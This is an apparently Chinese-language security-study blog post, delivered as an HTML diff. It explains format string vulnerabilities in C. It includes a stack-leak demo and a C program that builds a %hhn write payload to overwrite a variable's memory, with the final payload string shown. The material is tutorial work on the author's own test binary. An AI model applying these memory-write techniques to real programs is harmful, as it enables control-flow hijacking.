@@ -1,0 +1,1028 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"leeyuxun.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"./public/search.xml"};
+  </script>
+
+  <meta name="description" content="前言格式化字符串漏洞是广泛存在于基于C&#x2F;C++的可执行文件中的漏洞，是典型的二进制常见漏洞之一，其危害甚至超过了缓冲区溢出；">
+<meta property="og:type" content="article">
+<meta property="og:title" content="二进制-格式化字符串漏洞">
+<meta property="og:url" content="https://leeyuxun.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%20%E4%B8%8B%E5%8D%881.44.18.html">
+<meta property="og:site_name" content="Leeyuxun の note">
+<meta property="og:description" content="前言格式化字符串漏洞是广泛存在于基于C&#x2F;C++的可执行文件中的漏洞，是典型的二进制常见漏洞之一，其危害甚至超过了缓冲区溢出；">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225104238.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225105921.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225111728.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225111913.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225112418.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225140226.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225140630.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225141559.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225142155.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225142348.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225142610.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225144355.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225144437.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225144700.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225145622.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225145853.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225150637.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225150919.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225151137.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225152237.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225153759.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225154548.png">
+<meta property="article:published_time" content="2021-02-25T02:04:02.000Z">
+<meta property="article:modified_time" content="2022-03-20T14:36:35.000Z">
+<meta property="article:author" content="李钰璕">
+<meta property="article:tag" content="格式化字符串">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225104238.png">
+
+<link rel="canonical" href="https://leeyuxun.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%20%E4%B8%8B%E5%8D%881.44.18.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>二进制-格式化字符串漏洞 | Leeyuxun の note</title>
+  
+    <script>
+      function sendPageView() {
+        if (CONFIG.hostname !== location.hostname) return;
+        var uid = localStorage.getItem('uid') || (Math.random() + '.' + Math.random());
+        localStorage.setItem('uid', uid);
+        navigator.sendBeacon('https://www.google-analytics.com/collect', new URLSearchParams({
+          v  : 1,
+          tid: 'UA-163555158-1',
+          cid: uid,
+          t  : 'pageview',
+          dp : encodeURIComponent(location.pathname)
+        }));
+      }
+      document.addEventListener('pjax:complete', sendPageView);
+      sendPageView();
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container[display="true"] {
+  overflow: auto hidden;
+}
+
+mjx-container[display="true"] + br {
+  display: none;
+}
+</style></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Leeyuxun の note</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">BUPT | SCSS</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://leeyuxun.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%20%E4%B8%8B%E5%8D%881.44.18.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="李钰璕">
+      <meta itemprop="description" content="安全学习笔记">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leeyuxun の note">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          二进制-格式化字符串漏洞
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-02-25 10:04:02" itemprop="dateCreated datePublished" datetime="2021-02-25T10:04:02+08:00">2021-02-25</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-03-20 22:36:35" itemprop="dateModified" datetime="2022-03-20T22:36:35+08:00">2022-03-20</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">二进制学习</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>格式化字符串漏洞是广泛存在于基于C/C++的可执行文件中的漏洞，是典型的二进制常见漏洞之一，其危害甚至超过了缓冲区溢出；</p>
+<span id="more"></span>
+
+<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>格式化函数是一种特殊的ANSI C函数，它们从格式化字符串中提取参数，并对这些参数进行处理。而格式化字符串将C语言的主要数据类型，以易于阅读的方式保存在字符串里。从程序输出数据、打印错误信息到处理字符串数据，格式化字符串几乎出现在所有的C程序中。</p>
+<h2 id="格式化输出函数"><a href="#格式化输出函数" class="headerlink" title="格式化输出函数"></a>格式化输出函数</h2><h3 id="printf"><a href="#printf" class="headerlink" title="printf"></a>printf</h3><ul>
+<li>  功能：向stdout按规定的格式输出信息；</li>
+<li>格式：<code>int printf (const char *format,[argument]...)</code><ul>
+<li>  format是格式控制字符串，其他参数为输出项；</li>
+<li>  <code>printf("Id=%d",Id);</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="sprintf"><a href="#sprintf" class="headerlink" title="sprintf"></a>sprintf</h3><ul>
+<li>  功能：把格式化的数据写入某个字符串中；</li>
+<li>格式：<code>int sprintf(char *buffer,const char *format,[argument]...)</code><ul>
+<li>  buffer是要写入字符串的缓冲区；</li>
+<li>  函数按照第二部分格式化字符的格式，把第三部分的数据进行格式化，然后在把格式化后的数据类型，存储到字符串的缓存区间里去；</li>
+<li>  <code>sprintf(buffer, "Id=%d", Id);</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="snprintf"><a href="#snprintf" class="headerlink" title="snprintf"></a>snprintf</h3><ul>
+<li>  功能：把格式化的数据写入某个字符串中，控制字符串长度；</li>
+<li>格式：<code>int snprintf(char *str,size_t size,const char *format,[argument]...)</code><ul>
+<li>  在sprintf的基础上限制了可写入字符的最大值size；</li>
+<li>  当格式化后的字符串长度&lt;size，则将字符串全部复制到str中，并在最后添加字符串结束符<code>\0</code>；当格式化后的字符串长度&gt;=size，则将其中的size-1个字符复制到str中，并在最后添加字符串结束符<code>\0</code>；</li>
+<li>  <code>sprintf(buffer, 10,"Id=%d", Id);</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="fprintf"><a href="#fprintf" class="headerlink" title="fprintf"></a>fprintf</h3><ul>
+<li>  功能：用于格式化输出到一个流/文件中；</li>
+<li>格式：<code>int fprintf(FILE *stream,const char *format,[argument]...)</code><ul>
+<li>  根据指定的格式控制字符串format向输出流stream中写入数据；</li>
+<li>  当stream为stdout时，fprintf与printf的功能相同；</li>
+<li>   <code>printf(pfile,"Id=%d",Id);</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="vprintf-vsprintf-vsnprintf-vfprintf"><a href="#vprintf-vsprintf-vsnprintf-vfprintf" class="headerlink" title="vprintf/vsprintf/vsnprintf/vfprintf"></a>vprintf/vsprintf/vsnprintf/vfprintf</h3><ul>
+<li>  功能分别对应于printf/sprintf/snprintf/fprintf；</li>
+<li>  将变参列表换成了va_list类型的参数</li>
+<li>格式：<ul>
+<li>  <code>vprintf (format,va_list);</code></li>
+<li>  <code>vsprintf (buffer,format,va_list);</code></li>
+<li>  <code>vsnprintf (buffer,256,format,va_list);</code></li>
+<li>  <code>vfprintf(stream, format, va_list);</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><ul>
+<li><p>格式化字符串是由普通字符串和格式化规定字符构成的字符序列：</p>
+<ul>
+<li>  普通字符被原封不动地复制到输出流中；</li>
+<li>  格式化规定字符则是以<code>%</code>开始，用来确定输出内容格式；</li>
+</ul>
+</li>
+<li><p>基本格式</p>
+<p>  <code>%[parameter][flags][fieldwidth][.precision][length]type</code></p>
+<ul>
+<li><p>parameter</p>
+<ul>
+<li>  可以忽略或者是<code>n$</code>，n表示是参数列表的第n个参数，通过这种形式直接访问第n个参数；</li>
+</ul>
+</li>
+<li><p>flags</p>
+<ul>
+<li>  用于调整输出和打印的符号、空白、小数点、八进制和十六进制前缀等；</li>
+</ul>
+</li>
+<li><p>fieldwidth</p>
+<ul>
+<li>  限制显示数值的最小宽度，当输出字符个数不足限制的宽度时，默认用空格填充，或者flags中的其他填充方式，超过限制宽度不会截断，正常显示；</li>
+</ul>
+</li>
+<li><p>precision</p>
+<ul>
+<li>  输出的最大长度；</li>
+</ul>
+</li>
+<li><p>length</p>
+<ul>
+<li>指浮点型参数或者整形参数的长度；<ul>
+<li>  hh：1-byte；</li>
+<li>  h：2-byte；</li>
+<li>  l：4-byte；</li>
+<li>  ll：8-byte；</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>type</p>
+<ul>
+<li><p>转换说明符，用来说明所应用的转换类型，它是唯一必须的格式域；</p>
+<table>
+<thead>
+<tr>
+<th>字符</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>d/i</td>
+<td>有符号十进制整数</td>
+</tr>
+<tr>
+<td>u</td>
+<td>无符号十进制整数</td>
+</tr>
+<tr>
+<td>x/X</td>
+<td>以十六进制形式输出无符号整数(不输出前缀0x)</td>
+</tr>
+<tr>
+<td>o</td>
+<td>以八进制形式输出无符号整数(不输出前缀0)</td>
+</tr>
+<tr>
+<td>s</td>
+<td>字符串</td>
+</tr>
+<tr>
+<td>c</td>
+<td>字符</td>
+</tr>
+<tr>
+<td>p</td>
+<td>指针</td>
+</tr>
+<tr>
+<td>n</td>
+<td>不输出字符，把已经成功输出的字符个数写入对应的整型指针参数所指的变量</td>
+</tr>
+<tr>
+<td>f/F</td>
+<td>以小数形式输出单、双精度实数</td>
+</tr>
+<tr>
+<td>e/E</td>
+<td>以指数形式输出单、双精度实数</td>
+</tr>
+<tr>
+<td>g/G</td>
+<td>以%f%e中较短的输出宽度输出单、双精度实数，%e格式在指数小于-4或者大于等于精度时使用</td>
+</tr>
+<tr>
+<td>a/A</td>
+<td>浮点数、十六进制数字和p-计数法</td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>格式化字符串函数是根据格式化字符串函数来进行解析的，那么相应的要被解析的参数的个数也自然是由这个<strong>格式化字符串</strong>所控制；</p>
+<p>根据<strong>cdecl的调用约定</strong>，在进入printf()函数之前，将参数从右到左依次压栈。进入printf()之后,函数首先获取第一个参数，一次读取一个字符。如果字符不是<code>%</code>，字符直接复制到输出中；否则，读取下一个非空字符，获取相应的参数并解析输出。<br>格式化字符串的参数与后面实际提供的是一一对应的，就不会出现什么问题，但如果在格式化字符串多加几个格式化字符的时候，程序会怎么办呢？此时其可以正常通过编译，并且在栈上取值，按照给的格式化字符来解析对应栈上的值，发生了<strong>格式化字符串漏洞</strong>。</p>
+<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225104238.png" style="zoom:40%;">
+
+<h2 id="格式化字符串利用方法"><a href="#格式化字符串利用方法" class="headerlink" title="格式化字符串利用方法"></a>格式化字符串利用方法</h2><h3 id="泄漏内存地址"><a href="#泄漏内存地址" class="headerlink" title="泄漏内存地址"></a>泄漏内存地址</h3><p>通过格式化字符串漏洞能够对栈中的数据进行泄露；</p>
+<p>示例：如下程序只提供了format参数，却没有提供其他参数，编译并运行此程序会导致内存数据泄漏；</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* fs_read */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%08x\n%08x\n%08x\n"</span>)</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+
+<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225105921.png" style="zoom:50%;">
+
+<p>分析：</p>
+<ul>
+<li>  printf按照format的要求，输出了3个数值，但这些数值并不是输入的参数，而是保存在栈中的数值，打印出的这三个字符串正是位于format参数之后的数据；</li>
+</ul>
+<p>gdb调试分析：</p>
+<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225111728.png" style="zoom:30%;">
+
+<p>format参数的地址为<code>0x80484c0</code>；</p>
+<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225111913.png" style="zoom:30%;">
+
+<p>栈中format地址后的三个地址的值分别为<code>0xffffd694</code>、<code>0xffffd69c</code>、<code>0x8048461</code>；</p>
+<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225112418.png" style="zoom:33%;">
+
+<h3 id="覆写内存"><a href="#覆写内存" class="headerlink" title="覆写内存"></a>覆写内存</h3><p>覆盖内存通常其实就是改写内存，包括<strong>改写栈上的内存和任意地址的内存</strong>，从而来控制程序的执行流程；</p>
+<p>示例，程序如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* fs_write */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> flag = <span class="number">0xbabe</span>;</span><br><span class="line"><span class="type">int</span> flag_addr = <span class="number">0x804a028</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">    <span class="type">int</span> i,write_byte,already_write;</span><br><span class="line">    <span class="type">int</span> value = <span class="number">0xbeef</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> format[<span class="number">256</span>]={<span class="number">0</span>};</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">256</span>]={<span class="number">0</span>};</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"flag:%#x\n"</span>,flag);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(format,<span class="string">"\x28\xa0\x04\x08"</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(format,<span class="string">"\x29\xa0\x04\x08"</span>); </span><br><span class="line">    </span><br><span class="line">    already_write=<span class="number">8</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">2</span>;i++){</span><br><span class="line">        <span class="keyword">if</span>(value&gt;&gt;(<span class="number">8</span>*i)==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        write_byte = value&gt;&gt;(<span class="number">8</span>*i)&amp;<span class="number">0xff</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">sprintf</span>(buf,<span class="string">"%%%dc%%%d$hhn"</span>,(write_byte-already_write+<span class="number">0x100</span>)%<span class="number">0x100</span>,<span class="number">11</span>+i);</span><br><span class="line">        already_write+=(write_byte-already_write)%<span class="number">0x100</span>;</span><br><span class="line">        <span class="built_in">strcat</span>(format,buf);</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">printf</span>(format);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"flag:%#x\n"</span>,flag);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+
+<p>上述程序演示了利用格式化字符串漏洞修改flag变量的值：flag的初值为0xbabe，利用格式化字符串漏洞，修改为0xbeef；</p>
+<p>复写内存的核心功能在<code>printf(format)</code>中实现，具体的思路是：</p>
+<ul>
+<li>  首先在格式化字符串中放入flag变量的地址；</li>
+<li>  然后利用<code>$</code>来指定这个地址位于第几个参数；</li>
+<li>  最终使用<code>%n</code>(即hhn)向这个参数所指向的地址处写入数据；</li>
+</ul>
+<p>分析：</p>
+<ul>
+<li><p>首先strcpy()函数利用IDA事先分析后获取的flag变量地址，拷贝给format：</p>
+<ul>
+<li><p>使用IDA事先查看flag的地址为<code>0x804a028</code>，由于要向flag中写入<code>0xbeef</code>，也就是说要向<code>0x804a028</code>和<code>0x804a029</code>两个地址中写入内容，因此将这两个地址放入到format中；</p>
+  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225140226.png" style="zoom:40%;">
+
+</li>
+<li><p>  <code>strcpy(format,"\x28\xa0\x04\x08");</code></p>
+</li>
+<li><p>  <code>strcat(format,"\x29\xa0\x04\x08");</code></p>
+</li>
+</ul>
+</li>
+<li><p>然后确定写在format数组里的两个地址属于printf的第几个参数，通过gdb进行调试，在printf(format)处设置断点进行查看；</p>
+<ul>
+<li><p>下图所示，format的地址为<code>0xffffd3dc</code>，是printf的第11个参数，即<code>(0xffffd3dc-0xffffd3b0)/4=11</code>，由于flag的两个地址写在了format最开始 的位置，因此它们分别是printf的第11和第12个参数；</p>
+<p>  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225140630.png"></p>
+</li>
+</ul>
+</li>
+<li><p>最后利用<code>%n</code>(即hhn)向flag的两个地址中进行写入；</p>
+<ul>
+<li>由于<code>%n</code>是将之前打印的所有字符数写入到某一地址中，所以要计算好打印的字符数,这里构造格式化字符串的格式如下：<ul>
+<li>  <code>% width c % num $ hhn % width c % num $ hhn</code></li>
+<li>  通过for语句的两轮循环，写入两轮<code>% width c % num $ hhn</code>；</li>
+<li>  <code>hhn</code>表示每次写入一个字节到地址中；</li>
+</ul>
+</li>
+<li>分析<code>% width c % num $ hhn</code>；<ul>
+<li>width用来计算正确的值以写入到<code>%hhn</code>中；<ul>
+<li>计算width是通过已写入的字节数和要写入的值进行计算；<ul>
+<li>  例如，为了写入<code>0xef</code>到指定地址，由于在format数组的起始部分已经写入了8字节的flag地址，所以应该再填充<code>0xef-8</code>个字节(<code>ef</code>转成10进制为239再减8为231，即算写入的字符个数)；同理，写入<code>0xbe</code>时要减去前面写过的<code>0xef</code>长度，得到需要填充的长度，为了防止这个数负值，加上<code>0x100</code>再取模；</li>
+</ul>
+</li>
+<li>  num指定写入到第几个参数，在上一步已经确认了是第11和12个；</li>
+<li>  hhn表示每次写入一个字节到地址中；</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>最终format中的内容为</p>
+<p>  <code>\x28\xa0\x04\x08\x29\xa0\x04\x08%231c%11$hhn%207c%12$hhn</code>；</p>
+<ul>
+<li><p>通过gdb调试来进行验证，查看format数组地址上的内容，已经覆写；</p>
+  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225141559.png" style="zoom:40%;"></li>
+<li><p>对应到栈中验证参数的位置，为原参数；</p>
+  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225142155.png" style="zoom:30%;"></li>
+<li><p>执行printf(format)后，查看flag地址的内容改为了<code>0xbeef</code>；</p>
+  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225142348.png" style="zoom:33%;">
+
+</li>
+<li><p>执行程序，flag的值被修改为<code>0xbeef</code>；</p>
+  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225142610.png" style="zoom:33%;"></li>
+</ul>
+</li>
